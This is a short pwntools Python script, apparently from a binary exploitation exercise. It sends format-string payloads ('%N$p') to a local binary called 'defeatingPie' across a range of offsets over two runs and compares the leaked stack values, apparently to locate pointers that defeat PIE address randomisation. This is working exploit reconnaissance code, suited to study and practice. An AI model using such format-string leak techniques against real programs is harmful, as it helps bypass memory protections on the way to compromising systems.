import sys #To get command line arguments
from pwn import *

elf = context.binary = ELF("./defeatingPie")
context.log_level='warn' #Stop pwntools from logging process ID and etc. so we only get the info we need.
context.terminal = ["tmux", "splitw", "-h"] #to open gdb vertically
###########################################
#           Exploit Goes Here
###########################################
gdbScript = '''
piebase
'''





argLen = len(sys.argv)


if argLen != 3:
    print("You need to specify start number and stop number")
    print("You specified: " + str(argLen))
    exit(1)

fromVal = int(sys.argv[1])
toVal = int(sys.argv[2])

firstRun = []
secondRun = []
maxIndexWidth = 14

for j in range(0, 2):
    for i in range(fromVal, toVal):
        try:
            p = process(elf.path)
            if args.GDB:
                g = gdb.attach(p, gdbScript)
            #Format the counter
            #e.g. %2$p will attempt to print the [i]th pointer/string/hex/char/int
            p.sendlineafter(b"data:\n", '%{}$p'.format(i).encode())
            #Receive the response
            p.recvuntil(b"entered:\n")
            result = p.recvline().decode('utf-8')
            result = result.replace('\n','')
            if j == 0:
                firstRun.append(result)
            else:
                secondRun.append(result)
            p.close()
        except EOFError:
            pass


max_index_width = len(str(len(firstRun)))
max_address_width = max(len(value) for value in firstRun + secondRun)

for index, (value1, value2) in enumerate(zip(firstRun, secondRun), start=1):
    index_str = str(index).rjust(max_index_width)
    value1_str = value1.ljust(max_address_width)
    value2_str = value2.ljust(max_address_width)
    print(f"{index_str}: {value1_str}   {index_str}: {value2_str}")

if args.GDB:
    p.interactive()
